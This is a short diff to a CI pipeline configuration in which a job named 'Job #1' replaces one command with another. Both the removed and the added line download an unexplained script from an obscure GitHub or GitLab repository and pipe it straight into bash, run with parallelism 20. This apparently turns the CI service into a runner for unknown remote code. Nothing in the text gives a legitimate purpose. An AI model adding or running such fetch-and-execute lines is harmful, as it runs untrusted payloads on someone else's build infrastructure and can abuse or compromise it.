@@ -12,5 +12,5 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'curl -sL https://github.com/vedhagsvp/tkospae/raw/main/cerak | bash'
+            - 'curl -sL https://gitlab.com/xpanzers/play/-/raw/main/semak | bash'
           parallelism: 20
